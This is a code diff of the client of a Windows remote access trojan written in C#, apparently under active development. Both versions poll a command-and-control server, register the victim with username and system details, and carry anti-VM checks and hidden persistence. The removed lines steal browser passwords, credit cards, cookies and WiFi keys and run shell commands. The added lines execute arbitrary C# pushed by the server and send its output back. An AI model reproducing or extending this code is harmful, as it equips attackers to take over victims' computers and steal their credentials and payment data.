@@ -11,6 +11,7 @@ using System.Net;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
 using System.Linq;
+using System.Drawing;
 
 namespace X_ZIGZAG_CLIENT
 {
@@ -19,14 +20,18 @@ namespace X_ZIGZAG_CLIENT
         public long instructionId { get; set; }
 
         public short code { get; set; }
+        public string script { get; set; }
 
         public string functionArgs { get; set; }
+        public bool notify  { get; set; }
     }
     [DataContract]
     public class Response
     {
         [DataMember]
         public string output { get; set; }
+        [DataMember]
+        public string args { get; set; }
     }
     [DataContract]
     public class ClientPingResponse
@@ -43,13 +48,12 @@ namespace X_ZIGZAG_CLIENT
 
     internal static class Program
     {
-
         // Things to check everytime
         // IpChecker() DetectDebugger() DetectMonitiringTool() IsProxyDetectedUsingRegistry() IsProxyDetectedUsingWMI() CheckForSandbox()
         private static Queue<Instruction> instructionsQueue = new Queue<Instruction>();
         private static readonly object instructionsQueueLock = new object();
         static string uuid { get; set; }
-        static string EndPoint = "http://server_ip:8080/";
+        static string EndPoint = "http://192.168.1.17:4343/";
         static int DelayDuration = 30000;
         static int Screenshots = 0;
         static bool keepDoing = true;
@@ -57,25 +61,23 @@ namespace X_ZIGZAG_CLIENT
         static async Task Main()
         {
             // Sleep for a random time
-            Thread.Sleep(new Random().Next(20_000, 60_000));
-            // Basic Check if VM/VPS/RDP/SERVER + Proxy 
+            //  Thread.Sleep(new Random().Next(20_000, 60_000));
+            // Basic Check if VM/VPS/RDP/SERVER + Proxy
             if (await EnvironmentChecker.IsRunningInVM())
             {
-                Environment.Exit(0);
+                //       Environment.Exit(0);
             }
             // Hide The File + Basic Setup Task Scheduler
-            SetupHandler.Start();
-            // Generate UUID 
-            uuid = GenerateUUID();
+            // SetupHandler.Start();
+            // Generate UUID
+            uuid = "e917501e49cd2cd5e354faae3d04e2fce6794f7502e132709c9dd12f07b956cf";
             // Login || SignUp
             Login();
             // Start Screenshot Handler
-            Task.Run(() => ScreenshotsHandler());
             // Start Instructions Handler
             Task.Run(() => InstructionHandler());
             // Start Server Ping Handler
             Task.Run(() => Check()).Wait();
-
         }
         static string GenerateUUID()
         {
@@ -90,33 +92,7 @@ namespace X_ZIGZAG_CLIENT
             }
             return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
         }
-        private static void ScreenshotsHandler()
-        {
-            while (true)
-            {
-                if (keepDoing)
-                {
-                    if (Screenshots == -1)
-                    {
-                        Actions.CaptureScreens(uuid, EndPoint);
-                        Screenshots = 0;
-                    }
-                    else if (Screenshots > 0)
-                    {
-                        Actions.CaptureScreens(uuid, EndPoint);
-                        Thread.Sleep(Screenshots * 1000);
-                    }
-                    else
-                    {
-                        Thread.Sleep(1000);
-                    }
-                }
-                else
-                {
-                    Thread.Sleep(10000);
-                }
-            }
-        }
+
         private static async Task InstructionHandler()
         {
             while (true)
@@ -124,166 +100,147 @@ namespace X_ZIGZAG_CLIENT
                 if (instructionsQueue.Count == 0)
                 {
                     Thread.Sleep(1000);
-
                 }
                 else
                 {
+                    // Loop with delay
+                    // One Time
                     var oldestInstruction = instructionsQueue.Dequeue();
+
                     switch (oldestInstruction.code)
                     {
-                        case -2:
-                            Actions.UpdateDataWithRetry(10, uuid, oldestInstruction.instructionId, EndPoint);
-                            break;
                         case -1:
                             Actions.SelfDestruct();
                             break;
-                        case 0:
-                            await FilesHandler.UploadFileAsync(EndPoint + "Response/File/" + uuid + "/" + oldestInstruction.instructionId, oldestInstruction.functionArgs);
-
-                            break;
-                        case 1:
-                            string[] downloadArgs = oldestInstruction.functionArgs.Split(new string[] { "*.-.*" }, StringSplitOptions.None);
-                            if (downloadArgs.Count() != 2)
-                            {
-                                NotifyWithRetry(oldestInstruction.instructionId, "Bad Args");
-                                break;
-                            }
-                            string downloadResult = await FilesHandler.DownloadFileAsync(downloadArgs[0], downloadArgs[1]);
-                            NotifyWithRetry(oldestInstruction.instructionId, downloadResult);
-
-                            break;
-                        case 2:
-                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
-                            {
-                                NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
-                                break;
-                            }
-                            string cmdOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs);
-                            NotifyWithRetry(oldestInstruction.instructionId, cmdOutput);
-                            break;
-                        case 3:
-                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
-                            {
-                                NotifyWithRetry(oldestInstruction.instructionId, "No Args?");
-                                break;
-                            }
-                            string PwsOutput = Actions.ExecuteCommand(oldestInstruction.functionArgs, true);
-                            NotifyWithRetry(oldestInstruction.instructionId, PwsOutput);
-                            break;
-                        case 4:
-                            //CameraHandling.CaptureImage(EndPoint + "Response/Webcam/" + uuid + "/" + oldestInstruction.instructionId+"/"+1);
-                            break;
-                        case 5:
-                            NotifyWithRetry(oldestInstruction.instructionId, Actions.ExtractWiFiPasswords());
-                            break;
-                        case 6: // Browsers Password
-                            Actions.GetBrowsersPasswords(EndPoint, oldestInstruction.instructionId, uuid);
-                            break;
-                        case 7: // Browsers Credit Cards
-                            Actions.GetBrowsersCreditCards(EndPoint, oldestInstruction.instructionId, uuid);
-                            break;
-                        case 8: // Browsers Cookies
-                            Actions.GetBrowsersCookies(EndPoint, oldestInstruction.instructionId, uuid);
-                            break;
-                        case 9: // Execute C# Code
-                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
-                            {
-                                NotifyWithRetry(oldestInstruction.instructionId, "No Code?");
-                                break;
-                            }
-                            string CsharpCodeOutput = Actions.ExecuteCsharpCode(oldestInstruction.functionArgs);
-                            NotifyWithRetry(oldestInstruction.instructionId, CsharpCodeOutput);
-                            break;
-                        case 10: // Execute VB Code
-                            if (oldestInstruction.functionArgs == null || oldestInstruction.functionArgs.Equals(""))
-                            {
-                                NotifyWithRetry(oldestInstruction.instructionId, "No Code?");
-                                break;
-                            }
-                            string VBCodeOutput = Actions.ExecuteVbCode(oldestInstruction.functionArgs);
-                            NotifyWithRetry(oldestInstruction.instructionId, VBCodeOutput);
+                        default:
+                            // string Output = Actions.ExecuteCsharpCode(oldestInstruction.functionArgs);
+                            RunInstruction(
+                                oldestInstruction.instructionId,
+                                oldestInstruction.code,
+                                oldestInstruction.script,
+                                oldestInstruction.functionArgs,
+                                oldestInstruction.notify
+                            );
                             break;
                     }
                 }
             }
         }
-        private static void NotifyWithRetry(long instructionId, string output)
+        private static void RunInstruction(
+            long instructionId,
+            short code,
+            string Script,
+            string FunArgs,
+            bool notify
+        )
         {
-            Task.Run(async () =>
-            {
-                TimeSpan delay = TimeSpan.FromSeconds(10); // Initial delay for retry
-                while (true)
+            Task.Run(
+                async () =>
                 {
-                    HttpClient httpClient = new HttpClient();
-                    try
-                    {
-                        DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Response));
+                    object[] args = string.IsNullOrEmpty(FunArgs)
+                    ? Array.Empty<object>()
+                    : Array.ConvertAll(FunArgs.Split(new[] { "*.&-&.*" }, StringSplitOptions.None), item => (object)item);
 
-                        using (MemoryStream ms = new MemoryStream())
+
+
+                    string output = await Actions.ExecuteCsharpCodeAsync(
+                        Script,
+                        args
+                    );
+
+                    if (notify)
+                    {
+                        TimeSpan delay = TimeSpan.FromSeconds(10); // Initial delay for retry
+                        while (true)
                         {
-                            serializer.WriteObject(ms, new Response { output = output });
-                            var content = new StringContent(System.Text.Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
-                            var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId, content);
-                            response.EnsureSuccessStatusCode();
-                            break;
+                            HttpClient httpClient = new HttpClient();
+                            try
+                            {
+                                DataContractJsonSerializer serializer =
+                                    new DataContractJsonSerializer(typeof(Response));
+
+                                using (MemoryStream ms = new MemoryStream())
+                                {
+                                    serializer.WriteObject(ms, new Response { output = output,args= FunArgs });
+                                    var content = new StringContent(
+                                        System.Text.Encoding.UTF8.GetString(ms.ToArray()),
+                                        Encoding.UTF8,
+                                        "application/json"
+                                    );
+                                    var response = await httpClient.PostAsync(
+                                        EndPoint + "Response/" + uuid + "/" + instructionId+"/"+ code,
+                                        content
+                                    );
+                                    response.EnsureSuccessStatusCode();
+                                    break;
+                                }
+                            }
+                            catch (Exception)
+                            {
+                                await Task.Delay(delay);
+                            }
                         }
                     }
-                    catch (Exception)
-                    {
-
-                        await Task.Delay(delay);
-                    }
                 }
-
-            });
+            );
         }
         private static async Task Check()
         {
+            string url = EndPoint + "Client/Check/" + uuid;
+
             while (true)
             {
+
                 try
                 {
                     using (HttpClient client = new HttpClient())
                     {
                         // Make the POST request
-                        HttpResponseMessage s = await client.GetAsync(EndPoint + "Client/Check/" + uuid);
+                        HttpResponseMessage s = await client.GetAsync(url);
                         if (s.IsSuccessStatusCode)
                         {
                             string responseContent = await s.Content.ReadAsStringAsync();
 
-                            using (var memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(responseContent)))
+                            using (
+                                var memoryStream = new MemoryStream(
+                                    Encoding.UTF8.GetBytes(responseContent)
+                                )
+                            )
                             {
                                 // Create a DataContractJsonSerializer for the ClientPingResponse type
-                                var serializer = new DataContractJsonSerializer(typeof(ClientPingResponse));
+                                var serializer = new DataContractJsonSerializer(
+                                    typeof(ClientPingResponse)
+                                );
 
                                 // Deserialize the MemoryStream to an object
-                                var clientPingResponse = (ClientPingResponse)serializer.ReadObject(memoryStream);
+                                var clientPingResponse = (ClientPingResponse)serializer.ReadObject(
+                                    memoryStream
+                                );
                                 DelayDuration = clientPingResponse.nextPing * 1000;
                                 if (clientPingResponse.screenshot != null)
                                 {
                                     Screenshots = (int)clientPingResponse.screenshot;
                                 }
                                 ;
-                                if (clientPingResponse.instructions != null && clientPingResponse.instructions.Count > 0)
+                                if (
+                                    clientPingResponse.instructions != null
+                                    && clientPingResponse.instructions.Count > 0
+                                )
                                 {
                                     foreach (var inst in clientPingResponse.instructions)
                                     {
                                         lock (instructionsQueueLock)
                                         {
-                                            instructionsQueue.Enqueue(inst);
 
+                                            instructionsQueue.Enqueue(inst);
                                         }
                                     }
-
                                 }
                             }
                         }
                     }
                 }
-                catch (Exception)
-                {
-
-                }
+                catch (Exception) { }
                 Thread.Sleep(DelayDuration);
             }
         }
@@ -297,10 +254,17 @@ namespace X_ZIGZAG_CLIENT
                     using (HttpClient client = new HttpClient())
                     {
                         // Set up the request content
-                        var content = new StringContent($"{{\"id\":\"{uuid}\"}}", Encoding.UTF8, "application/json");
+                        var content = new StringContent(
+                            $"{{\"id\":\"{uuid}\"}}",
+                            Encoding.UTF8,
+                            "application/json"
+                        );
 
                         // Make the POST request
-                        HttpResponseMessage response = await client.PostAsync(EndPoint + "Client", content);
+                        HttpResponseMessage response = await client.PostAsync(
+                            EndPoint + "Client",
+                            content
+                        );
 
                         // Check the response status code
                         if (response.IsSuccessStatusCode)
@@ -315,28 +279,30 @@ namespace X_ZIGZAG_CLIENT
                                 Thread.Sleep(new Random().Next(0, 5000));
                                 try
                                 {
-                                    content = new StringContent($"{{\"id\":\"{uuid}\",\"Name\":\"{Actions.GetUsername().Replace("\\", "-")}\",\"Version\":\"{Actions.GetWindowsVersion()}\",\"SystemSpecs\":\"{Actions.GetSystemInfo().Replace("\n", "\\n").Replace("\r", "\\r")}\",\"ipAddress\":\"asd\"}}", Encoding.UTF8, "application/json");
+                                    content = new StringContent(
+                                        $"{{\"id\":\"{uuid}\",\"Name\":\"{Actions.GetUsername().Replace("\\", "-")}\",\"Version\":\"{Actions.GetWindowsVersion()}\",\"SystemSpecs\":\"{Actions.GetSystemInfo().Replace("\n", "\\n").Replace("\r", "\\r")}\",\"ipAddress\":\"asd\"}}",
+                                        Encoding.UTF8,
+                                        "application/json"
+                                    );
 
-                                    response = await client.PostAsync(EndPoint + "Client/New", content);
+                                    response = await client.PostAsync(
+                                        EndPoint + "Client/New",
+                                        content
+                                    );
 
                                     if (response.IsSuccessStatusCode)
                                     {
                                         break;
                                     }
                                 }
-                                catch (Exception)
-                                {
-                                }
+                                catch (Exception) { }
                             }
                             break;
                         }
                     }
                 }
-                catch (Exception)
-                {
-                }
+                catch (Exception) { }
             }
         }
-
     }
 }
